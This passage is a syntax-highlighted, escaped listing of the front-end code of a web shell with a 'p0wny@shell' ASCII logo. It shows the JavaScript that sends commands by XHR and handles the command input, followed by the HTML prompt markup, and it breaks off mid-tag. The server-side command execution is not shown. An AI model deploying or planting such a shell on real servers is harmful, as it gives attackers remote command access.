class=\"s2\"\u003e\u0026#34;application/x-www-form-urlencoded\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonreadystatechange\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadyState\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatus\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponseJson\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseJson\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                            \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Error while parsing response: \u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003egetQueryString\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nx\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonclick\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nx\"\u003ewindow\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eselection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ewindow\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetSelection\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etarget\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etarget\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nx\"\u003eevent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esrcElement\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etagName\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;SELECT\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003eselection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etoString\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efocus\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nx\"\u003ewindow\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-cmd\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003eeShellContent\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-content\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003eupdateCwd\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nx\"\u003eeShellCmdInput\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efocus\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003escript\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003ehead\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e \u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003epre\u003c/span\u003e \u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-content\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e \u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-logo\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003e___\u003c/span\u003e                         \u003cspan class=\"nx\"\u003e____\u003c/span\u003e      \u003cspan class=\"nx\"\u003e_\u003c/span\u003e          \u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"nx\"\u003e_\u003c/span\u003e        \u003cspan class=\"nx\"\u003e_\u003c/span\u003e  \u003cspan class=\"nx\"\u003e_\u003c/span\u003e   \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"nx\"\u003e__\u003c/span\u003e  \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\__\u003c/span\u003e      \u003cspan class=\"nx\"\u003e___\u003c/span\u003e \u003cspan class=\"nx\"\u003e__\u003c/span\u003e  \u003cspan class=\"nx\"\u003e_\u003c/span\u003e   \u003cspan class=\"nx\"\u003e_\u003c/span\u003e  \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"nx\"\u003e__\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\\u003c/span\u003e \u003cspan class=\"nx\"\u003e___\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e__\u003c/span\u003e   \u003cspan class=\"nx\"\u003e___\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\\u003c/span\u003e\u003cspan class=\"o\"\u003e/||\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;_ \\| | | \\ \\ /\\ / / \u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|/\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"err\"\u003e`\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"nx\"\u003e__\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"nx\"\u003e_\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e  \u003cspan class=\"o\"\u003e..\u003c/span\u003e  \u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\\u003c/span\u003e \u003cspan class=\"nx\"\u003eV\u003c/span\u003e  \u003cspan class=\"nx\"\u003eV\u003c/span\u003e \u003cspan class=\"o\"\u003e/|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\__\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e  \u003cspan class=\"nx\"\u003e__\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e   \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e      \u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e__\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\___\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e  \u003cspan class=\"nx\"\u003e\\_\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\_\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\__\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\\u003c/span\u003e \u003cspan class=\"nx\"\u003e\\__\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e___\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e\\___\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e    \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e||\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e  \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e_\u003c/span\u003e\u003cspan class=\"o\"\u003e|\u003c/span\u003e                         \u003cspan class=\"o\"\u003e|\u003c/span\u003e\u003cspan class=\"nx\"\u003e___\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e  \u003cspan class=\"nx\"\u003e\\____\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e                                  \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003espan\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003epre\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e \u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-input\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003elabel\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-cmd\u0026#34;\u003c/span\u003e \u003cspan class=\"nx\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-prompt\u0026#34;\u003c/span\u003e \u003cspan class=\"nx\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;shell-prompt\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;???\u0026lt;/\u003c/span\u003e\u003cspan class=\"nx\"\u003elabel\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ediv\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan 